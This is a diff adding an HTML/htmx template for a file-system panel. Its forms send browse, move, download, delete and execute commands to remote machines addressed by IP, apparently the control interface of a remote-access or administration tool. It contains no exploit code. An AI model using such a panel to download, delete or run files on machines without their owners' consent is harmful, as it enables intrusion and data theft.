@@ -1,0 +1,139 @@
+<div class="col-span-1 glass-effect rounded-xl p-6 shadow-lg">
+    <div class="flex items-center gap-3 mb-4">
+        <div
+            class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
+        >
+            <svg
+                class="w-4 h-4 text-gray-300"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2H5a2 2 0 00-2 2z"
+                ></path>
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M8 5a2 2 0 012-2h2a2 2 0 012 2v0a2 2 0 002 2h2a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2V9a2 2 0 012-2h2a2 2 0 002-2V5z"
+                ></path>
+            </svg>
+        </div>
+        <h3 class="text-xl font-semibold text-white">File System (FS)</h3>
+    </div>
+    <div class="space-y-4">
+        <!-- Browse Files -->
+        <form
+            hx-post="/api/command/{{ ip }}"
+            hx-target="#command-output-{{ ip }}"
+        >
+            <input type="hidden" name="module" value="FS" />
+            <input type="hidden" name="args.operation" value="GET" />
+            <div class="flex gap-2">
+                <input
+                    type="text"
+                    name="args.path"
+                    placeholder="Path (e.g., C:\, D:\Users\)"
+                    class="flex-grow px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all"
+                />
+                <button
+                    type="submit"
+                    class="bg-gray-600 hover:bg-gray-500 text-white px-4 py-2 rounded-lg transition-all duration-200 flex items-center gap-2"
+                >
+                    <svg
+                        class="w-4 h-4"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            stroke-linecap="round"
+                            stroke-linejoin="round"
+                            stroke-width="2"
+                            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
+                        ></path>
+                    </svg>
+                    Browse
+                </button>
+            </div>
+        </form>
+
+        <!-- Move/Rename -->
+        <form
+            hx-post="/api/command/{{ ip }}"
+            hx-target="#command-output-{{ ip }}"
+        >
+            <input type="hidden" name="module" value="FS" />
+            <input type="hidden" name="args.operation" value="MOV" />
+            <div class="grid grid-cols-2 gap-2">
+                <input
+                    type="text"
+                    name="args.path"
+                    placeholder="Source path"
+                    class="px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm focus:border-gray-400 transition-all"
+                />
+                <input
+                    type="text"
+                    name="args.to"
+                    placeholder="Destination"
+                    class="px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm focus:border-gray-400 transition-all"
+                />
+            </div>
+            <button
+                type="submit"
+                class="w-full mt-2 bg-gray-700 hover:bg-gray-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+            >
+                Move / Rename
+            </button>
+        </form>
+
+        <!-- File Operations -->
+        <form
+            hx-post="/api/command/{{ ip }}"
+            hx-target="#command-output-{{ ip }}"
+        >
+            <input type="hidden" name="module" value="FS" />
+            <input
+                type="text"
+                name="args.path"
+                placeholder="File/folder path for operations below"
+                class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm focus:border-gray-400 transition-all mb-3"
+            />
+            <div class="grid grid-cols-3 gap-2">
+                <button
+                    type="submit"
+                    hx-vals='{"args.operation": "DOWN"}'
+                    class="bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+                >
+                    Download
+                </button>
+                <button
+                    type="submit"
+                    hx-vals='{"args.operation": "DEL"}'
+                    class="bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+                >
+                    Delete
+                </button>
+                <button
+                    type="submit"
+                    hx-vals='{"args.operation": "RUN"}'
+                    class="bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
+                >
+                    Execute
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<style>
+    .glass-effect {
+        background: rgba(32, 32, 32, 0.8);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+</style>
